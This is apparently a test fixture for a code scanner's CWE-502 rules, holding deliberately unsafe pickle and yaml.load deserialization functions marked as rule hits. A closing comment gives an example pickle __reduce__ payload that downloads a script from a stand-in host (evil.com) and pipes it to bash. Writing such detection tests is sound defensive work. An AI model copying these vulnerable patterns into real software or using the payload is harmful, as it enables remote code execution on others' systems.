"""
Trigger rules:
  - tg-py-pickle-load       (pickle deserialization)
  - tg-py-yaml-unsafe-load  (yaml.load without SafeLoader)
CWE-502: Deserialization of Untrusted Data
"""
import pickle
import yaml

# ── 🔴 pickle.loads() with external data ───────────────────────────────────
def load_user_session(session_cookie):
    """Deserialize session from cookie — attacker can inject code."""
    import base64
    raw = base64.b64decode(session_cookie)
    session = pickle.loads(raw)  # ❌ RULE HIT: tg-py-pickle-load
    return session

# ── 🔴 pickle.load() from file ─────────────────────────────────────────────
def load_model(model_path):
    """Load ML model from untrusted source."""
    with open(model_path, "rb") as f:
        model = pickle.load(f)  # ❌ RULE HIT: tg-py-pickle-load
    return model

# ── 🔴 yaml.load() without SafeLoader ──────────────────────────────────────
def parse_config(config_str):
    """Parse YAML config — allows arbitrary code execution."""
    config = yaml.load(config_str)  # ❌ RULE HIT: tg-py-yaml-unsafe-load
    return config

# ── 🔴 yaml.load() from file ───────────────────────────────────────────────
def load_rules(rule_file):
    with open(rule_file, "r") as f:
        data = yaml.load(f.read())  # ❌ RULE HIT: tg-py-yaml-unsafe-load
    return data

# ── Example attacker payload for pickle ─────────────────────────────────────
# import os
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ("curl http://evil.com/shell.sh | bash",))
